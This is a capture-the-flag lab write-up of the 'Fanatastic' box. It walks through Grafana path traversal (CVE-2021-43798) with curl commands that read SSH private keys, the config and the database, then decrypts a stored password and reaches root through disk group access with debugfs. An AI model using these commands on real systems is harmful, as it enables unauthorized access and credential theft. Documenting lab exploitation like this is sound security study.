---
description: Privilege Escalation via disk group → Access to /dev/sda using debugfs
icon: linux
---

# Fanatastic

## Summary

* Discovered Grafana dashboard on port 3000 vulnerable to path traversal (CVE-2021-43798).
* Retrieved sensitive files including private SSH keys and Grafana database.
* Decrypted the encrypted password stored in the Grafana DB using its `secret_key`.
* Logged in as `sysadmin` using recovered credentials.
* Escalated privileges via the `disk` group by accessing root's SSH key through `debugfs`.

***

## 🧵 Let's Unpack

***

**Enumeration**

```bash
sudo nmap -sV -sC -p- -Pn 192.168.229.181 --open
```

Open Ports:

* `22/tcp` → OpenSSH 8.2p1
* `3000/tcp` → Grafana login redirect
* `9090/tcp` → Prometheus (Go-based HTTP API)

***

**Initial Foothold**

**🔍 Target: Grafana (port 3000)**

* **Vulnerability**: Path Traversal – [CVE-2021-43798](https://github.com/jas502n/Grafana-CVE-2021-43798)

```sh
home/prometheus/.ssh/id_rsa

/home/sysadmin/.ssh/id_rsa
# reading sensitive file from graphana directory
/etc/grafana/grafana.ini

# reading Graphana database file using curl
/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db

curl --path-as-is http://192.168.229.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db

# reading the database file using sqlite
sqlite graphana.db
>
.tables

select * from data_source;

1|1|1|prometheus|Prometheus|server|http://localhost:9090||||0|sysadmin||0|{}|2022-02-04 09:19:59|2022-02-04 09:19:59|0|{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}|0|HkdQ8Ganz


> base64 creds found
anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
```



**🪪 Accessed sensitive files:**

```bash
# SSH keys
curl --path-as-is http://<IP>:3000/public/plugins/alertlist/../../../../../../../../home/sysadmin/.ssh/id_rsa

# Grafana config (contains secret_key)
curl --path-as-is http://<IP>:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini

# Grafana database dump
curl --path-as-is http://<IP>:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

{% hint style="success" %}
**💡 Reading password**

**Note: Data sources store passwords and basic auth passwords in secureJsonData encrypted (AES-256 in CFB mode) by default.**
{% endhint %}

**🔐 Password decryption using AES-256**

* Used script from exploit repo to decrypt the stored base64 password.
  * [https://github.com/jas502n/Grafana-CVE-2021-43798](https://github.com/jas502n/Grafana-CVE-2021-43798)

```bash
## We have everything to decrypt the password stored in secureJSONData
basic_auth_user = sysadmin
basicAuthPassword = YUVmMzI...


go run AESDecrypt.go 
>
[*] grafanaIni_secretKey= SW2YcwTI.....
[*] DataSourcePassword= YUVmMz...
[*] plainText= S...

username -> syaadmin
password -> S...
```

✅ Credentials:

* `Username`: sysadmin
* `Password`: SuperS....

***

**Privilege Escalation**

**🛠 Technique: Abusing disk group membership**

* `sysadmin` was in `disk` group.
* Device `/dev/sda1` had `rw` permission for the `disk` group:

```bash
brw-rw---- 1 root disk 8, 1 /dev/sda1
```

**🧬 Exploitation Steps:**

```bash
# check list of disks mounted on the mnachine
 df -h

# debug file system
debugfs /dev/sda2
debugfs: cd /root/.ssh
debugfs: cat id_rsa
```

* Retrieved root’s private key.
* SSH'd into the box as **root**.
